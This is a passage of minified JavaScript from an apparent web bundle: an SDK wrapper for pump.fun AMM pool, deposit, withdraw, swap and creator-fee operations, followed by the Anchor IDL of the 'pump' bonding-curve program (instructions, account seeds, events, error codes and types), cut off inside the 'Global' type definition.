        return this.pumpAmmInternalSdk.fetchGlobalConfigAccount();
      }
      fetchPool(t) {
        return this.pumpAmmInternalSdk.fetchPool(t);
      }
      decodeGlobalConfig(t) {
        return this.pumpAmmInternalSdk.decodeGlobalConfig(t);
      }
      decodePool(t) {
        return this.pumpAmmInternalSdk.decodePool(t);
      }
      async createPoolInstructions(t, e, n) {
        return this.pumpAmmInternalSdk.createPoolInstructionsInternal(t, e, n);
      }
      async createAutocompleteInitialPoolPrice(t, e) {
        return e.div(t);
      }
      async depositInstructions(t, e, n) {
        const {
            pool: r,
            poolBaseTokenAccount: o,
            poolQuoteTokenAccount: i,
          } = t,
          { maxBase: s, maxQuote: a } = (function (t, e, n, r, o) {
            if (o.isZero())
              throw new Error("Division by zero: totalLpTokens cannot be zero");
            const i = $m(n.mul(t), o),
              s = $m(r.mul(t), o),
              a = new Yn(1e9 * (1 + e / 100)),
              u = new Yn(1e9);
            return { maxBase: i.mul(a).div(u), maxQuote: s.mul(a).div(u) };
          })(
            e,
            n,
            new Yn(o.amount.toString()),
            new Yn(i.amount.toString()),
            r.lpSupply
          );
        return this.pumpAmmInternalSdk.depositInstructionsInternal(t, e, s, a);
      }
      depositAutocompleteQuoteAndLpTokenFromBase(t, e, n) {
        const { quote: r, lpToken: o } =
          this.pumpAmmInternalSdk.depositBaseInputInternal(t, e, n);
        return { quote: r, lpToken: o };
      }
      depositAutocompleteBaseAndLpTokenFromQuote(t, e, n) {
        const { base: r, lpToken: o } =
          this.pumpAmmInternalSdk.depositQuoteInputInternal(t, e, n);
        return { base: r, lpToken: o };
      }
      async withdrawInstructions(t, e, n) {
        const { minBase: r, minQuote: o } =
          this.pumpAmmInternalSdk.withdrawInputsInternal(t, e, n);
        return this.pumpAmmInternalSdk.withdrawInstructionsInternal(t, e, r, o);
      }
      withdrawAutoCompleteBaseAndQuoteFromLpToken(t, e, n) {
        const { base: r, quote: o } =
          this.pumpAmmInternalSdk.withdrawInputsInternal(t, e, n);
        return { base: r, quote: o };
      }
      async swapBaseInstructions(t, e, n, r) {
        return "quoteToBase" == r
          ? await this.pumpAmmInternalSdk.buyBaseInput(t, e, n)
          : await this.pumpAmmInternalSdk.sellBaseInput(t, e, n);
      }
      async swapQuoteInstructions(t, e, n, r) {
        return "quoteToBase" == r
          ? await this.pumpAmmInternalSdk.buyQuoteInput(t, e, n)
          : await this.pumpAmmInternalSdk.sellQuoteInput(t, e, n);
      }
      swapAutocompleteQuoteFromBase(t, e, n, r) {
        return "quoteToBase" == r
          ? this.pumpAmmInternalSdk.buyAutocompleteQuoteFromBase(t, e, n)
          : this.pumpAmmInternalSdk.sellAutocompleteQuoteFromBase(t, e, n);
      }
      swapAutocompleteBaseFromQuote(t, e, n, r) {
        return "quoteToBase" == r
          ? this.pumpAmmInternalSdk.buyAutocompleteBaseFromQuote(t, e, n)
          : this.pumpAmmInternalSdk.sellAutocompleteBaseFromQuote(t, e, n);
      }
      async extendAccount(t, e) {
        return this.pumpAmmInternalSdk.extendAccount(t, e);
      }
      async collectCoinCreatorFee(t) {
        return this.pumpAmmInternalSdk.collectCoinCreatorFee(t);
      }
      async getCoinCreatorVaultBalance(t) {
        return this.pumpAmmInternalSdk.getCoinCreatorVaultBalance(t);
      }
      coinCreatorVaultAuthorityPda(t) {
        return this.pumpAmmInternalSdk.coinCreatorVaultAuthorityPda(t);
      }
      coinCreatorVaultAta(t, e, n) {
        return this.pumpAmmInternalSdk.coinCreatorVaultAta(t, e, n);
      }
      async setCoinCreator(t) {
        return this.pumpAmmInternalSdk.setCoinCreator(t);
      }
      async createPoolSolanaState(t, e, n, r, o = void 0, i = void 0) {
        return this.pumpAmmInternalSdk.createPoolSolanaState(t, e, n, r, o, i);
      }
      async swapSolanaState(t, e, n = void 0, r = void 0) {
        return this.pumpAmmInternalSdk.swapSolanaState(t, e, n, r);
      }
      async liquiditySolanaState(t, e, n = void 0, r = void 0, o = void 0) {
        return this.pumpAmmInternalSdk.liquiditySolanaState(t, e, n, r, o);
      }
      async collectCoinCreatorFeeSolanaState(t, e = void 0) {
        return this.pumpAmmInternalSdk.collectCoinCreatorFeeSolanaState(t, e);
      }
    };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  var ug = {
    address: "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P",
    metadata: {
      name: "pump",
      version: "0.1.0",
      spec: "0.1.0",
      description: "Created with Anchor",
    },
    instructions: [
      {
        name: "buy",
        docs: ["Buys tokens from a bonding curve."],
        discriminator: [102, 6, 61, 18, 1, 218, 235, 234],
        accounts: [
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "fee_recipient", writable: !0 },
          { name: "mint" },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "associated_bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "bonding_curve" },
                {
                  kind: "const",
                  value: [
                    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70,
                    206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58,
                    140, 245, 133, 126, 255, 0, 169,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "associated_user", writable: !0 },
          { name: "user", writable: !0, signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "creator_vault",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 45, 118, 97, 117, 108, 116,
                  ],
                },
                {
                  kind: "account",
                  path: "bonding_curve.creator",
                  account: "BondingCurve",
                },
              ],
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "amount", type: "u64" },
          { name: "max_sol_cost", type: "u64" },
        ],
      },
      {
        name: "collect_creator_fee",
        docs: [
          "Collects creator_fee from creator_vault to the coin creator account",
        ],
        discriminator: [20, 22, 86, 123, 198, 28, 219, 132],
        accounts: [
          { name: "creator", writable: !0, signer: !0 },
          {
            name: "creator_vault",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 45, 118, 97, 117, 108, 116,
                  ],
                },
                { kind: "account", path: "creator" },
              ],
            },
          },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "create",
        docs: ["Creates a new coin and bonding curve."],
        discriminator: [24, 30, 200, 40, 5, 28, 7, 119],
        accounts: [
          { name: "mint", writable: !0, signer: !0 },
          {
            name: "mint_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    109, 105, 110, 116, 45, 97, 117, 116, 104, 111, 114, 105,
                    116, 121,
                  ],
                },
              ],
            },
          },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "associated_bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "bonding_curve" },
                {
                  kind: "const",
                  value: [
                    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70,
                    206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58,
                    140, 245, 133, 126, 255, 0, 169,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          {
            name: "mpl_token_metadata",
            address: "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s",
          },
          {
            name: "metadata",
            writable: !0,
            pda: {
              seeds: [
                { kind: "const", value: [109, 101, 116, 97, 100, 97, 116, 97] },
                {
                  kind: "const",
                  value: [
                    11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                    4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                    209, 188, 3, 248, 41, 70,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: { kind: "account", path: "mpl_token_metadata" },
            },
          },
          { name: "user", writable: !0, signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "rent",
            address: "SysvarRent111111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "name", type: "string" },
          { name: "symbol", type: "string" },
          { name: "uri", type: "string" },
          { name: "creator", type: "pubkey" },
        ],
      },
      {
        name: "extend_account",
        docs: ["Extends the size of program-owned accounts"],
        discriminator: [234, 102, 194, 203, 150, 72, 62, 229],
        accounts: [
          { name: "account", writable: !0 },
          { name: "user", signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "initialize",
        docs: ["Creates the global state."],
        discriminator: [175, 175, 109, 31, 13, 152, 155, 237],
        accounts: [
          {
            name: "global",
            writable: !0,
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "user", writable: !0, signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
        ],
        args: [],
      },
      {
        name: "migrate",
        docs: [
          "Migrates liquidity to pump_amm if the bonding curve is complete",
        ],
        discriminator: [155, 234, 231, 146, 236, 158, 162, 30],
        accounts: [
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "withdraw_authority", writable: !0, relations: ["global"] },
          { name: "mint" },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "associated_bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "bonding_curve" },
                {
                  kind: "const",
                  value: [
                    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70,
                    206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58,
                    140, 245, 133, 126, 255, 0, 169,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "user", signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "pump_amm",
            address: "pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA",
          },
          {
            name: "pool",
            writable: !0,
            pda: {
              seeds: [
                { kind: "const", value: [112, 111, 111, 108] },
                { kind: "const", value: [0, 0] },
                { kind: "account", path: "pool_authority" },
                { kind: "account", path: "mint" },
                { kind: "account", path: "wsol_mint" },
              ],
              program: { kind: "account", path: "pump_amm" },
            },
          },
          {
            name: "pool_authority",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    112, 111, 111, 108, 45, 97, 117, 116, 104, 111, 114, 105,
                    116, 121,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "pool_authority_mint_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool_authority" },
                { kind: "account", path: "token_program" },
                { kind: "account", path: "mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "pool_authority_wsol_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool_authority" },
                { kind: "account", path: "token_program" },
                { kind: "account", path: "wsol_mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "amm_global_config",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    103, 108, 111, 98, 97, 108, 95, 99, 111, 110, 102, 105, 103,
                  ],
                },
              ],
              program: { kind: "account", path: "pump_amm" },
            },
          },
          {
            name: "wsol_mint",
            address: "So11111111111111111111111111111111111111112",
          },
          {
            name: "lp_mint",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    112, 111, 111, 108, 95, 108, 112, 95, 109, 105, 110, 116,
                  ],
                },
                { kind: "account", path: "pool" },
              ],
              program: { kind: "account", path: "pump_amm" },
            },
          },
          {
            name: "user_pool_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool_authority" },
                { kind: "account", path: "token_2022_program" },
                { kind: "account", path: "lp_mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "pool_base_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool" },
                { kind: "account", path: "token_program" },
                { kind: "account", path: "mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool" },
                { kind: "account", path: "token_program" },
                { kind: "account", path: "wsol_mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "token_2022_program",
            address: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
          },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "pump_amm_event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
              program: { kind: "account", path: "pump_amm" },
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "sell",
        docs: ["Sells tokens into a bonding curve."],
        discriminator: [51, 230, 133, 164, 1, 127, 131, 173],
        accounts: [
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "fee_recipient", writable: !0 },
          { name: "mint" },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "associated_bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "bonding_curve" },
                {
                  kind: "const",
                  value: [
                    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70,
                    206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58,
                    140, 245, 133, 126, 255, 0, 169,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "associated_user", writable: !0 },
          { name: "user", writable: !0, signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "creator_vault",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 45, 118, 97, 117, 108, 116,
                  ],
                },
                {
                  kind: "account",
                  path: "bonding_curve.creator",
                  account: "BondingCurve",
                },
              ],
            },
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "amount", type: "u64" },
          { name: "min_sol_output", type: "u64" },
        ],
      },
      {
        name: "set_creator",
        docs: [
          "Allows Global::set_creator_authority to set the bonding curve creator from Metaplex metadata or input argument",
        ],
        discriminator: [254, 148, 255, 112, 207, 142, 170, 165],
        accounts: [
          { name: "set_creator_authority", signer: !0, relations: ["global"] },
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "mint" },
          {
            name: "metadata",
            pda: {
              seeds: [
                { kind: "const", value: [109, 101, 116, 97, 100, 97, 116, 97] },
                {
                  kind: "const",
                  value: [
                    11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                    4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                    209, 188, 3, 248, 41, 70,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                  4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                  209, 188, 3, 248, 41, 70,
                ],
              },
            },
          },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [{ name: "creator", type: "pubkey" }],
      },
      {
        name: "set_metaplex_creator",
        docs: [
          "Syncs the bonding curve creator with the Metaplex metadata creator if it exists",
        ],
        discriminator: [138, 96, 174, 217, 48, 85, 197, 246],
        accounts: [
          { name: "mint" },
          {
            name: "metadata",
            pda: {
              seeds: [
                { kind: "const", value: [109, 101, 116, 97, 100, 97, 116, 97] },
                {
                  kind: "const",
                  value: [
                    11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                    4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                    209, 188, 3, 248, 41, 70,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                  4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                  209, 188, 3, 248, 41, 70,
                ],
              },
            },
          },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "set_params",
        docs: ["Sets the global state parameters."],
        discriminator: [27, 234, 178, 52, 147, 2, 187, 141],
        accounts: [
          {
            name: "global",
            writable: !0,
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          {
            name: "authority",
            writable: !0,
            signer: !0,
            relations: ["global"],
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "initial_virtual_token_reserves", type: "u64" },
          { name: "initial_virtual_sol_reserves", type: "u64" },
          { name: "initial_real_token_reserves", type: "u64" },
          { name: "token_total_supply", type: "u64" },
          { name: "fee_basis_points", type: "u64" },
          { name: "withdraw_authority", type: "pubkey" },
          { name: "enable_migrate", type: "bool" },
          { name: "pool_migration_fee", type: "u64" },
          { name: "creator_fee_basis_points", type: "u64" },
          { name: "set_creator_authority", type: "pubkey" },
        ],
      },
      {
        name: "update_global_authority",
        discriminator: [227, 181, 74, 196, 208, 21, 97, 213],
        accounts: [
          {
            name: "global",
            writable: !0,
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "authority", signer: !0, relations: ["global"] },
          { name: "new_authority" },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
    ],
    accounts: [
      {
        name: "BondingCurve",
        discriminator: [23, 183, 248, 55, 96, 216, 172, 96],
      },
      {
        name: "Global",
        discriminator: [167, 232, 232, 177, 200, 108, 114, 127],
      },
    ],
    events: [
      {
        name: "CollectCreatorFeeEvent",
        discriminator: [122, 2, 127, 1, 14, 191, 12, 175],
      },
      {
        name: "CompleteEvent",
        discriminator: [95, 114, 97, 156, 212, 46, 152, 8],
      },
      {
        name: "CompletePumpAmmMigrationEvent",
        discriminator: [189, 233, 93, 185, 92, 148, 234, 148],
      },
      {
        name: "CreateEvent",
        discriminator: [27, 114, 169, 77, 222, 235, 99, 118],
      },
      {
        name: "ExtendAccountEvent",
        discriminator: [97, 97, 215, 144, 93, 146, 22, 124],
      },
      {
        name: "SetCreatorEvent",
        discriminator: [237, 52, 123, 37, 245, 251, 72, 210],
      },
      {
        name: "SetMetaplexCreatorEvent",
        discriminator: [142, 203, 6, 32, 127, 105, 191, 162],
      },
      {
        name: "SetParamsEvent",
        discriminator: [223, 195, 159, 246, 62, 48, 143, 131],
      },
      {
        name: "TradeEvent",
        discriminator: [189, 219, 127, 211, 78, 230, 97, 238],
      },
      {
        name: "UpdateGlobalAuthorityEvent",
        discriminator: [182, 195, 137, 42, 35, 206, 207, 247],
      },
    ],
    errors: [
      {
        code: 6e3,
        name: "NotAuthorized",
        msg: "The given account is not authorized to execute this instruction.",
      },
      {
        code: 6001,
        name: "AlreadyInitialized",
        msg: "The program is already initialized.",
      },
      {
        code: 6002,
        name: "TooMuchSolRequired",
        msg: "slippage: Too much SOL required to buy the given amount of tokens.",
      },
      {
        code: 6003,
        name: "TooLittleSolReceived",
        msg: "slippage: Too little SOL received to sell the given amount of tokens.",
      },
      {
        code: 6004,
        name: "MintDoesNotMatchBondingCurve",
        msg: "The mint does not match the bonding curve.",
      },
      {
        code: 6005,
        name: "BondingCurveComplete",
        msg: "The bonding curve has completed and liquidity migrated to raydium.",
      },
      {
        code: 6006,
        name: "BondingCurveNotComplete",
        msg: "The bonding curve has not completed.",
      },
      {
        code: 6007,
        name: "NotInitialized",
        msg: "The program is not initialized.",
      },
      { code: 6008, name: "WithdrawTooFrequent", msg: "Withdraw too frequent" },
      {
        code: 6009,
        name: "NewSizeShouldBeGreaterThanCurrentSize",
        msg: "new_size should be > current_size",
      },
      {
        code: 6010,
        name: "AccountTypeNotSupported",
        msg: "Account type not supported",
      },
      {
        code: 6011,
        name: "InitialRealTokenReservesShouldBeLessThanTokenTotalSupply",
        msg: "initial_real_token_reserves should be less than token_total_supply",
      },
      {
        code: 6012,
        name: "InitialVirtualTokenReservesShouldBeGreaterThanInitialRealTokenReserves",
        msg: "initial_virtual_token_reserves should be greater than initial_real_token_reserves",
      },
      {
        code: 6013,
        name: "FeeBasisPointsGreaterThanMaximum",
        msg: "fee_basis_points greater than maximum",
      },
      {
        code: 6014,
        name: "AllZerosWithdrawAuthority",
        msg: "Withdraw authority cannot be set to System Program ID",
      },
      {
        code: 6015,
        name: "PoolMigrationFeeShouldBeLessThanFinalRealSolReserves",
        msg: "pool_migration_fee should be less than final_real_sol_reserves",
      },
      {
        code: 6016,
        name: "PoolMigrationFeeShouldBeGreaterThanCreatorFeePlusMaxMigrateFees",
        msg: "pool_migration_fee should be greater than creator_fee + MAX_MIGRATE_FEES",
      },
      {
        code: 6017,
        name: "DisabledWithdraw",
        msg: "Migrate instruction is disabled",
      },
      {
        code: 6018,
        name: "DisabledMigrate",
        msg: "Migrate instruction is disabled",
      },
      { code: 6019, name: "InvalidCreator", msg: "Invalid creator pubkey" },
      { code: 6020, name: "BuyZeroAmount", msg: "Buy zero amount" },
      {
        code: 6021,
        name: "NotEnoughTokensToBuy",
        msg: "Not enough tokens to buy",
      },
      { code: 6022, name: "SellZeroAmount", msg: "Sell zero amount" },
      {
        code: 6023,
        name: "NotEnoughTokensToSell",
        msg: "Not enough tokens to sell",
      },
      { code: 6024, name: "Overflow", msg: "Overflow" },
      { code: 6025, name: "Truncation", msg: "Truncation" },
      { code: 6026, name: "DivisionByZero", msg: "Division by zero" },
      {
        code: 6027,
        name: "NotEnoughRemainingAccounts",
        msg: "Not enough remaining accounts",
      },
      {
        code: 6028,
        name: "AllFeeRecipientsShouldBeNonZero",
        msg: "All fee recipients should be non-zero",
      },
      {
        code: 6029,
        name: "UnsortedNotUniqueFeeRecipients",
        msg: "Unsorted or not unique fee recipients",
      },
      {
        code: 6030,
        name: "CreatorShouldNotBeZero",
        msg: "Creator should not be zero",
      },
    ],
    types: [
      {
        name: "BondingCurve",
        type: {
          kind: "struct",
          fields: [
            { name: "virtual_token_reserves", type: "u64" },
            { name: "virtual_sol_reserves", type: "u64" },
            { name: "real_token_reserves", type: "u64" },
            { name: "real_sol_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
            { name: "complete", type: "bool" },
            { name: "creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "CollectCreatorFeeEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "creator", type: "pubkey" },
            { name: "creator_fee", type: "u64" },
          ],
        },
      },
      {
        name: "CompleteEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "user", type: "pubkey" },
            { name: "mint", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "timestamp", type: "i64" },
          ],
        },
      },
      {
        name: "CompletePumpAmmMigrationEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "user", type: "pubkey" },
            { name: "mint", type: "pubkey" },
            { name: "mint_amount", type: "u64" },
            { name: "sol_amount", type: "u64" },
            { name: "pool_migration_fee", type: "u64" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "timestamp", type: "i64" },
            { name: "pool", type: "pubkey" },
          ],
        },
      },
      {
        name: "CreateEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "name", type: "string" },
            { name: "symbol", type: "string" },
            { name: "uri", type: "string" },
            { name: "mint", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "creator", type: "pubkey" },
            { name: "timestamp", type: "i64" },
            { name: "virtual_token_reserves", type: "u64" },
            { name: "virtual_sol_reserves", type: "u64" },
            { name: "real_token_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
          ],
        },
      },
      {
        name: "ExtendAccountEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "account", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "current_size", type: "u64" },
            { name: "new_size", type: "u64" },
            { name: "timestamp", type: "i64" },
          ],
        },
      },
      {
        name: "Global",
        type: {
          kind: "struct",
          fields: [
